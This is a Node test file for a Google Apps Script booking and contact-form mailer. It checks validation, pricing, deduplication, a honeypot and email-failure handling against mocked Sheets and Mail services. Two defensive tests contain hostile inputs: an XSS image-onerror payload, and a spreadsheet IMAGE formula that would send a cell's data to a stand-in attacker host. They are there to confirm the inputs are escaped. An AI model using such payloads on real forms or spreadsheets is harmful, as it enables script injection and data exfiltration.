// Runs case-study-mailer.gs in Node with fake Google services (Sheets, Mail,
// Cache), so the Apps Script logic can be tested without deploying it.
//   node --test tests/
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';

const SOURCE = readFileSync(new URL('../case-study-mailer.gs', import.meta.url), 'utf8');

function load({ quota = 100, failMailTo = null } = {}) {
  const sheets = {};
  const sent = [];
  const cache = new Map();
  const logs = [];
  const sheet = name => {
    const rows = (sheets[name] ||= []);
    return {
      getLastRow: () => rows.length,
      appendRow: r => rows.push(r),
      setFrozenRows: () => {},
    };
  };
  const ctx = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ({
      getSheetByName: n => (sheets[n] ? sheet(n) : null),
      insertSheet: n => sheet(n),
      getSheets: () => [sheet('Sheet1')],
    }) },
    MailApp: {
      getRemainingDailyQuota: () => quota,
      sendEmail: m => {
        if (failMailTo && m.to === failMailTo) throw new Error('simulated mail failure');
        sent.push(m);
      },
    },
    CacheService: { getScriptCache: () => ({
      get: k => cache.get(k) ?? null,
      put: (k, v) => cache.set(k, v),
    }) },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: s => ({ setMimeType: () => ({ getContent: () => s }) }),
    },
    Utilities: {
      formatDate: () => '260930',
      base64Encode: b => Buffer.from(b).toString('base64'),
      computeDigest: (_a, s) => [...Buffer.from(String(s))],
      DigestAlgorithm: { MD5: 'md5' },
    },
    UrlFetchApp: { fetch: () => ({ getBlob: () => ({ setName() { return this; } }) }) },
    Logger: { log: m => logs.push(m) },
  };
  vm.createContext(ctx);
  vm.runInContext(SOURCE, ctx);
  const post = parameter => JSON.parse(ctx.doPost({ parameter }).getContent());
  return { post, sheets, sent, logs };
}

const booking = (over = {}) => ({
  form: 'audit_booking', name: 'Asha Rao', email: 'Asha@Example.com', company: 'Acme Cloud',
  spend: '$10k–$50k', phone: '+91 98765 43210', currency: 'INR', notes: 'Mostly EC2', page: 'test',
  ...over,
});

test('valid booking: logged, hello@ notified, customer confirmed, reference returned', () => {
  const { post, sheets, sent } = load();
  const res = post(booking());
  assert.equal(res.ok, true);
  assert.match(res.reference, /^AUD-260930-[A-HJ-NP-Z2-9]{4}$/);

  const rows = sheets['Audit bookings'];
  assert.equal(rows.length, 2, 'header + one booking');
  assert.equal(rows[0][1], 'Reference');
  const row = rows[1];
  assert.equal(row[1], res.reference);
  assert.equal(row[3], 'asha@example.com', 'email is lower-cased');
  assert.equal(row[8], '₹19,999');
  assert.equal(row.at(-1), 'new');

  assert.equal(sent.length, 2);
  assert.equal(sent[0].to, 'hello@exommerce.online');
  assert.equal(sent[0].replyTo, 'asha@example.com');
  assert.ok(sent[0].subject.includes(res.reference));
  assert.equal(sent[1].to, 'asha@example.com');
  assert.equal(sent[1].replyTo, 'hello@exommerce.online');
  assert.ok(sent[1].htmlBody.includes(res.reference));
  assert.ok(sent[1].body.startsWith('Hi Asha,'));
});

test('price comes from the server, not the browser', () => {
  const { post, sheets } = load();
  post(booking({ currency: 'USD', price: '$1' }));
  assert.equal(sheets['Audit bookings'][1][8], '$299');
  const other = load();
  other.post(booking({ currency: 'GBP' }));
  assert.equal(other.sheets['Audit bookings'][1][7], 'USD', 'unknown currency falls back to USD');
});

test('validation rejects bad input and sends nothing', () => {
  const cases = [
    [{ name: '' }, /name and company/],
    [{ company: '   ' }, /name and company/],
    [{ email: 'not-an-email' }, /valid email/],
    [{ spend: '$1M' }, /monthly AWS spend/],
    [{ phone: 'call me maybe' }, /phone/],
  ];
  for (const [over, msg] of cases) {
    const { post, sent, sheets } = load();
    const res = post(booking(over));
    assert.equal(res.ok, false, JSON.stringify(over));
    assert.match(res.error, msg);
    assert.equal(sent.length, 0);
    assert.equal(sheets['Audit bookings'], undefined);
  }
});

test('phone is optional', () => {
  const { post } = load();
  assert.equal(post(booking({ phone: '' })).ok, true);
});

test('resubmitting within 10 minutes returns the same reference and sends nothing new', () => {
  const { post, sent, sheets } = load();
  const first = post(booking());
  const again = post(booking({ email: 'asha@example.com', company: 'ACME CLOUD' }));
  assert.equal(again.ok, true);
  assert.equal(again.reference, first.reference);
  assert.equal(again.duplicate, true);
  assert.equal(sent.length, 2);
  assert.equal(sheets['Audit bookings'].length, 2);
});

test('honeypot: bots get a fake success and nothing happens', () => {
  const { post, sent, sheets } = load();
  assert.deepEqual(post(booking({ website: 'http://spam' })), { ok: true });
  assert.equal(sent.length, 0);
  assert.equal(sheets['Audit bookings'], undefined);
});

test('email quota exhausted: booking still logged as failed, customer told to email', () => {
  const { post, sheets, sent } = load({ quota: 1 });
  const res = post(booking());
  assert.equal(res.ok, false);
  assert.match(res.error, /hello@exommerce.online/);
  assert.equal(sent.length, 0);
  assert.match(sheets['Audit bookings'][1].at(-1), /^failed: daily email quota/);
});

test('notification failure: logged as failed and reported, so the page falls back to email', () => {
  const { post, sheets } = load({ failMailTo: 'hello@exommerce.online' });
  const res = post(booking());
  assert.equal(res.ok, false);
  assert.match(sheets['Audit bookings'][1].at(-1), /^failed: Error: simulated mail failure/);
});

test('confirmation failure does not fail a booking hello@ already has', () => {
  const { post, sheets, logs } = load({ failMailTo: 'asha@example.com' });
  const res = post(booking());
  assert.equal(res.ok, true);
  assert.equal(sheets['Audit bookings'][1].at(-1), 'new');
  assert.match(logs[0], /confirmation failed/);
});

test('HTML in names is escaped in the confirmation email', () => {
  const { post, sent } = load();
  post(booking({ name: '<img src=x onerror=alert(1)> Rao' }));
  assert.ok(!sent[1].htmlBody.includes('<img'));
  assert.ok(sent[1].htmlBody.includes('&lt;img'));
});

test('spreadsheet formulas from visitors are stored as plain text', () => {
  const { post, sheets } = load();
  post(booking({ name: '=IMAGE("https://evil.example/?"&A1)', company: '@SUM(1)', notes: '-2+3' }));
  const row = sheets['Audit bookings'][1];
  assert.equal(row[2], `'=IMAGE("https://evil.example/?"&A1)`);
  assert.equal(row[4], "'@SUM(1)");
  assert.equal(row[6], "'+91 98765 43210", 'phone numbers stay text, not a formula');
  assert.equal(row[9], "'-2+3");
  // (the Date comes from the sandbox's realm, so check its tag, not instanceof)
  assert.equal(Object.prototype.toString.call(row[0]), '[object Date]', 'non-strings are untouched');

  const other = load();
  other.post({ form: 'contact', first_name: '=1+1', email: 'a@b.co', company: 'C', message: 'Hi' });
  assert.equal(other.sheets['Contact enquiries'][1][1], "'=1+1", 'contact tab protected too');
});

test('under-$3k bookings are flagged for hello@', () => {
  const { post, sent } = load();
  post(booking({ spend: 'Under $3k' }));
  assert.match(sent[0].body, /under the \$3k\/month minimum/);
});

test('long fields are trimmed to their limits', () => {
  const { post, sheets } = load();
  post(booking({ notes: 'x'.repeat(5000), name: 'N'.repeat(300) }));
  const row = sheets['Audit bookings'][1];
  assert.equal(row[2].length, 100);
  assert.equal(row[9].length, 2000);
});

test('GET reports which forms this deployment handles', () => {
  const src = SOURCE;
  const ctx = { ContentService: { MimeType: { JSON: 'json' }, createTextOutput: s => ({ setMimeType: () => ({ getContent: () => s }) }) } };
  vm.createContext(ctx);
  vm.runInContext(src, ctx);
  const res = JSON.parse(ctx.doGet().getContent());
  assert.equal(res.ok, true);
  assert.ok(res.forms.includes('audit_booking'));
});

test('existing flows still route correctly', () => {
  const { post, sheets } = load();
  const contact = post({ form: 'contact', first_name: 'A', email: 'a@b.co', company: 'C', message: 'Hi' });
  assert.equal(contact.ok, true);
  assert.equal(sheets['Contact enquiries'].length, 2);
  const cs = post({ study: 'nope', first_name: 'A', email: 'a@b.co', company: 'C', consent: 'yes' });
  assert.deepEqual(cs, { ok: false, error: 'Unknown case study' });
});
